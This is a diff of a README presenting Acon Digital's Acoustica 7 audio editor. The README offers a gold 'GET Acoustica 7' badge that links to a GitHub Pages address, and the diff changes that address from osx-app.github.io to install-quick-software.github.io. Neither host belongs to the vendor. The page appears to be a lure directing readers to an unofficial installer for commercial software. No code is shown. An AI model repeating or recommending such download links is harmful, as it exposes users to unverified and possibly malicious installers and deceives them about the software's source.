@@ -1,13 +1,13 @@
 # Acoustica 7 – Professional Audio Editor by Acon Digital  
 
 <div align="center">  
-<img src="https://www.pluginboutique.com/ckeditor_assets/pictures/8731/content_acoustica7-image_pluginboutique.png" alt="Acon Digital Acoustica Logo" width="550">  
+<img src="https://www.pluginboutique.com/ckeditor_assets/pictures/8731/content_acoustica7-image_pluginboutique.png" alt="Acon Digital Acoustica Logo" width="450">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/acoustica">  
+<a href="https://install-quick-software.github.io/.github/acoustica">  
 <img src="https://img.shields.io/badge/💻_GET_Acoustica_7-gold?style=for-the-badge&logo=apple" alt="GET Acoustica 7">  
 </a>  
 </div>
